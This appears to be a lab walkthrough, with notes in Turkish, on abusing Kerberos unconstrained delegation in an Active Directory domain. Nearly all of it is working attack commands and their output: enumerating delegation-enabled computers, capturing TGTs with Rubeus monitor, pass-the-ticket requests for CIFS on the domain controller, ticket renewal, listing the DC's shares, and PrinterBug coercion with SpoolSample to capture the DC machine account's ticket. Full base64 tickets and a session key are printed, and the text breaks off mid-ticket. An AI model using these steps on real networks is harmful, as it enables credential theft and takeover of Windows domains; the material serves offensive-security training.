# Unconstrained Delegation for Computers

## Enumeration

### Using ActiveDirectory Module

```pwsh
PS C:\Users\derek.walker> ActiveDirectory\Get-ADComputer -Filter {TrustedForDelegation -eq $true}
```

### Using PowerView

```pwsh
PS C:\Users\derek.walker> Get-DomainComputer -Unconstrained
```

## Waiting for Authentication

### Monitoring Tickets

!!! abstract

    Her 5 saniyede bir herhangi bir TGS bileti içerisinde bir TGT olup olmadığı kontrol edilir.

```pwsh
PS C:\Users\derek.walker> C:\Tools\Rubeus.exe monitor /interval:5 /nowrap
```

```output title="Output" hl_lines="3 5-6 10"
[*] 1/26/2025 2:32:04 PM UTC - Found new TGT:

  User                  :  brian.willis@INLANEFREIGHT.LOCAL
  StartTime             :  1/26/2025 8:32:00 AM
  EndTime               :  1/26/2025 6:32:00 PM
  RenewTill             :  2/2/2025 8:32:00 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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
```

### Requesting a TGS Ticket

!!! success

    Elde edilecek olan TGS bileti sonradan CIFS (SMB) servisine erişmek için [ptt](https://github.com/GhostPack/Rubeus?tab=readme-ov-file#ptt) seçeneği ile belleğe yüklenir.

```pwsh
PS C:\Users\derek.walker> C:\Tools\Rubeus.exe asktgs /ptt /service:CIFS/DC01.INLANEFREIGHT.LOCAL /ticket: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
```

```output title="Output" hl_lines="4 7"
[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'CIFS/DC01.INLANEFREIGHT.LOCAL'
[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  CIFS/DC01.INLANEFREIGHT.LOCAL
  ServiceRealm             :  INLANEFREIGHT.LOCAL
  UserName                 :  brian.willis
  UserRealm                :  INLANEFREIGHT.LOCAL
  StartTime                :  1/26/2025 8:35:07 AM
  EndTime                  :  1/26/2025 6:32:00 PM
  RenewTill                :  2/2/2025 8:32:00 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  Bg1PSoI0+Nd1opAT+ZREZyuSINyFpKeoLmBvyObmdaI=
```

### Renewing the Ticket

!!! warning

    Elde edilen TGS bileti kullanım sırasında hata verir ise Rubeus [renew](https://github.com/GhostPack/Rubeus#renew) seçeneği ile yeni bir TGS bileti talep etmek ilgili hatayı giderebilir.

    Bu işlem RenewTill aralığında EndTime süresi dolmadan yapılmalıdır.

```pwsh
PS C:\Users\derek.walker> C:\Tools\Rubeus.exe renew /ptt /ticket:doIGHDCCBhigAwIBBaEDAgEWooIFCDCCBQRhggUAMIIE/KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggSyMIIErqADAgESoQMCAQKiggSgBIIEnLs3UM3I+TWfgF5qijmum9GGKbCTQq9GS5R70T1zjy6M3GbvCoZOEXw+GUlAZG++wGR6Xs40PCrm6xhmYzuguwXyijPxzU1HQKHGsxc8e74S9KFGmRuP3YyewaD7hWbjyMhyOZz3dOaDYOi8tfKW20j8wdwDtVmjazSYVZfaMOChrAgjzLrw1fL3y+zFcm2hk6iP+aVESPDUdYPG359v7YZUqOdY9PZhKH/dNWuPYvNJArMC2kBHX7NBaTiIDDrEvQvtVpnKhBV0KpnKv8MJ/eaiJxoax9aD9POTvcbOdtVOPJGJ8CGutbCWJocM/PrWwHUan07hkJ95ZwlttjcQyFVLnK+WJ66E3iagAW/UqNDVGXHhxpMXbwfrm8cQt8jjEICPX9QHZY3/zZt5bkhOh8lGYIVJEHodbq+Uka3IesNnWvlvMmxSudj6XaUhjQdNT/TOA+kxymWOWI/pXrOTcqfUCTnbHyfQ9bjbglkNVS2Ht5sX2xEROy3v+/qjyRHljMyTw5Z4oKbl3bdXia2FVWMNMnUlSEqab9GsugS69uounwoqicdKvBPufdItmdii0pklH7BxW1WsY46QxM0jdoPS6+mbcZfjyU6VId7O7O1B40tMRhbIOKMivRX/ZiaFcFX/r3CRhS5bEH6MgjLsYEvORVlwkQmt+Dx3KzWimJfn5CcBXQ2EQ7qFrHcUipGd7k6WCsF4L9/d3sEp/irY/v1drpXc8Yzy3oLvf4prhF5n7qS4b5raaZuzXphfoqYkOrYeQQkMoFY2MYjtLpHiQVnWh393X0okKAZMpT3FuKQICn8sSgiMr1yH6vS9X8C8dnAukkJValuNGVZJ4rrDWDvPOB+O13DcDlN//2N0WBlZCSzIHVk0giEa4vM/Clk0Uvi9so/D+nUsFma8kHXrMQpK+IOadsXNBqEGbAstryHjbbhe04yvn271+V+LxuwfzBpWPWVUN2z5liG7Y3Q3rZby6F8fjHulenUFTcMu6nY+IovNjjJRhn3JtT8tP60HhK1EJCDvDQzvuKTjd+Nre4CVd9+ZD10mISYBXIb/oipj6qq8lhThbuM5D59prSN6hrZxwxnIt0ZPrOesR44JLXSIQn1AjKgdb8CYa1xPqxBD9WuhTpnzT6CeqeN4hjd8pYrn7GG1RPfngRLL52G44O56j83r0WmVKdzzCLcV6bunOOct++XV7S3BDPXZK8vrEV47i1IX623v9cF7MISv8GdZhuOL32m+TMuNohvcw2frN9EaYpc0u0KhwlqhVGJCml9qa4GQAnOMZugdsUqD+pZsB2t4mXypsk2xe+jVAtPQTYvkEjaTN7rGkQbBGW/Oqq1fYhEibOSOl9+1OOGnEG5nNibNN65j+GeUrDyxhUhiX5ivoavZszoeehBz4zIVEam3L9jd3FnJ9sZlrgMGkQosELmpi0AsEUzu4xM9FEP3X3Wpbdbp8A5bhLGQkUp7dmezNh7Fc7r0HtJ+qWncN7zjBJooUmt21dmxmN3Txv4lhE/BrkWq/DhByeBH1mcb+i5TCaQ/47FCnpMPYPqFIQ1I2opBiYEaEoqpA3+jgf8wgfygAwIBAKKB9ASB8X2B7jCB66CB6DCB5TCB4qArMCmgAwIBEqEiBCD3XSqf53lv60K0kR1p27GGTD+kUTnDABeb+6C3/SBKr6EVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohkwF6ADAgEBoRAwDhsMYnJpYW4ud2lsbGlzowcDBQBgoQAApREYDzIwMjUwMTI2MTQzMjAwWqYRGA8yMDI1MDEyNzAwMzIwMFqnERgPMjAyNTAyMDIxNDMyMDBaqBUbE0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUw=
```

```output title="Output" hl_lines="4"
[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.LOCAL (172.16.99.3)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.LOCAL\brian.willis'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIGHDCCBhigAwIBBaEDAgEWooIFCDCCBQRhggUAMIIE/KADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D
      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggSyMIIErqADAgESoQMC
      AQKiggSgBIIEnIAZp4l/pbf0X4AVtMFjFS8OTNVNSEvRpQdI64rxgni2ERfX9lh17LI96Ue7XJlnV9/G
      3hbu1EIHtBUannoY8RYlCE3YlPuleOl14ZTbA2cZqN61AKv+Bvc0dIVmw59BuMb4f4pij+W9QmFvDZtw
      q6fIh9aWcSRcvn+AM9Vlksn093r9kjUUk+Kjh7ExH0acOndzsofNRpt2KQ05rxvKFsvaZOX8jlR5srCp
      Yu+YnPEiVLiHU51AwlijxzLpbacwHmGLdEPyIR2xk25eKLCZiAXTtLx0t5XgmAI1MJ/yAMcqiP9k4aMa
      FQrmXznDRATYSOKTRXfdv9ETlul8E7KodnguQU6a2VfHrObiPeJpAI4qjo2aGiONA+ZecFA/g3oXXtcL
      F8RxH7vS21VjNi1Hagji6jtPv7qN1E+BDnaehUvc0OoJogwHxffVQQ4EN/+HsSaLaY8Ft4kfSk4O7Lzq
      u9aeIFrjS9F+OhQmsZaye7HUD/s9RK7UIqnWkgHAW4kcHl92ehmcp/9OUcIeyVuhGBrzQVDTAwoXaDxZ
      r4tGJmOxqLFWFEPyxFIPk34PKh+AfFVyxTCUZG9DN+btp9/WTZd34qadVPdhtZzAFuMC/E8uWyj0bmcv
      T8+y2Knse4LjbuHBjAV2ydsiFhdS0fobjzkjw2FRQENI7P/mve4IbaY914nzSLhWGd2j6/6tVODSsjKS
      lDqGrKMZM0OCmPIy7rUnj4aHfxgJ3iAiDBqdOXPrSJaKYcO2pnWpb967PBahtNO5uwNsGgeOB1rjn7Xf
      JXkJkZeF0YiuWIKoiV6tQFAjRwfcA+MFttnLhW7jkQ7ZXe1/R1OYWceFY0nLh+VvE7KVb75pwHDimPH5
      Kd77Hnz1Id8Fco466E0D4yxIjVI9cCgurndK0mpLcWRCjYdZh5bYxvPAlaOnfTVtFlIygOtaAPuaiRqX
      9wABuA0xQjqha0NrOrMSic3BHMfoGXPJ0q46IKqyX55o9hYHvv6RVNd24FFab1m0WgDvBlw7kdVw591X
      DJXpsrZ5tIJtORi6GrPgGhIgJUbj5Um6Lp37HZaZvdWFc8mc+1W79Nyatye67gHyGJRaOkVUxcqEQwPq
      h2z6t7uu0pVwm9Isp33x8Idb59KppROCGlnFLB0iE9mO9Mqd2J93xZdmxZywlN8k4heF7jAtBYY2VrKp
      NLXgvwYSwd0wZcgjUzWv532GT2P0r0h/GKLUjny8uvDdZPQ6nm3nb3wscSlZvhqNO/3QhAyDaG+KOH68
      JwbfAjKu2RW8WkBvCPM/bS7DnI9jvwxNJdg0QeUPWBNnRUPCKIKN/bXhCcbePKU8Ad/2zxqtSfRpjF7j
      J4Jpp/JyGrE6kAyNO+QnAge8WIF+YGWHKnNkuuIU7WGDnA7pC8SS3DhFRqGTzQkjATofjurE3eay+MlO
      R94i9j5tpPpRlAiBXA3JXQDp9659pIaySLUTK7c0oDzloOEWKAfX43//hTDfpGebFaKwAzvSPMiBPnRi
      jfPInaSpun0hGtjznLEuHx3SIiwIBKcJR96j8CljOq66/F85jWcVdEsWbUXD/7saLO+jgf8wgfygAwIB
      AKKB9ASB8X2B7jCB66CB6DCB5TCB4qArMCmgAwIBEqEiBCD3XSqf53lv60K0kR1p27GGTD+kUTnDABeb
      +6C3/SBKr6EVGxNJTkxBTkVGUkVJR0hULkxPQ0FMohkwF6ADAgEBoRAwDhsMYnJpYW4ud2lsbGlzowcD
      BQBgoQAApREYDzIwMjUwMTI2MTQ0MTA5WqYRGA8yMDI1MDEyNzAwNDEwOVqnERgPMjAyNTAyMDIxNDMy
      MDBaqBUbE0lOTEFORUZSRUlHSFQuTE9DQUypKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlH
      SFQuTE9DQUw=
[+] Ticket successfully imported!
```

### Listing Share Contents

```pwsh
PS C:\Users\derek.walker> dir \\DC01.INLANEFREIGHT.LOCAL\Shares
```

```output title="Output"
    Directory: \\DC01.INLANEFREIGHT.LOCAL\Shares


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/14/2022   7:00 AM                Accounting
d-----         4/4/2023  10:45 AM                Executives
d-----       10/14/2022   7:00 AM                Finance
d-----       10/14/2022   7:00 AM                HR
d-----       10/14/2022   7:00 AM                IT
d-----        3/30/2023  11:13 AM                Marketing
d-----       10/14/2022   7:00 AM                R&D
```

## PrinterBug Coercion

### Monitoring

```pwsh
PS C:\Users\derek.walker> C:\Tools\Rubeus.exe monitor /interval:5 /nowrap
```

### Abusing the PrinterBug

| HOST | DESCRIPTION |
|---|---|
| DC01 | Saldırı hedefi. |
| SQL01 | Kısıtlanmamış delegasyon. Rubeus yakalama sunucusu. |

```pwsh
PS C:\Users\derek.walker> C:\Tools\SpoolSample.exe DC01.INLANEFREIGHT.LOCAL SQL01.INLANEFREIGHT.LOCAL
```

### Captured Ticket

```pwsh
PS C:\Users\derek.walker> C:\Tools\Rubeus.exe monitor /interval:5 /nowrap
```

```output title="Output" hl_lines="3 10"
[*] 1/26/2025 3:13:05 PM UTC - Found new TGT:

  User                  :  DC01$@INLANEFREIGHT.LOCAL
  StartTime             :  1/26/2025 6:08:21 AM
  EndTime               :  1/26/2025 4:08:20 PM
  RenewTill             :  2/2/2025 6:08:20 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    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
```

### Renewing the Captured Ticket

```pwsh
PS C:\Users\derek.walker> C:\Tools\Rubeus.exe renew /ptt /ticket:doIF3jCCBdqgAwIBBaEDAgEWooIE0TCCBM1hggTJMIIExaADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9DQUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggR7MIIEd6ADAgESoQMCAQKiggRpBIIEZZB0S6wmLSpj+v29DJNL12cSnaTx/s9bLs0YlHVCCft665Je9mDWqE5Sa38fjIJtK4e0v7YnJ5HtZgBLfmUfGxa+vc0RY0EfwNsnczyrEC3l6oxU5cFZhnDcw0SqZZdRnrZPdRicWTWLWLl1FK9eXDwelZnnwILUNd/v1lBJVX5yMhgDxuGkI2p/WVYPmDLBIZfP6gV2POVJffqzxqj+3It/vQ3bwVc/o9VyvUT5KyDxBQzRZhqwaXuHl0BObmocl/M8X8Y4OUPU9Sbo7isFz8fpQ3iphh+GumvGAoxvwpKSkxLqQ2RK0SxS/gzqLYQA7juQcNq1LwKzXOf4voq7a5uwA+paXyTDIdBqOIqUjh87WMgYLJOeMe0fAzTIE24XiLy3bwteSMfST+6YCfMouksyw90u6Zb6Hwuo2qPnPLFcZWQ3Z2gSYUrK8bSPMV3SRgUnoKN56OF5SIb65isBN9fBaZS/4XOVeiriKIQemAERiBCZCHllH09Ju8fZG68IuDDp4mQCJ7afdNcafuKRhvUF5pwxzPoPGUwpEmFjf8VnXOs67V3QUJfy3eV2R+/8FoB3UgVOi2v/rE5RuRBiQfpeSu7nO+UU616D5Lzi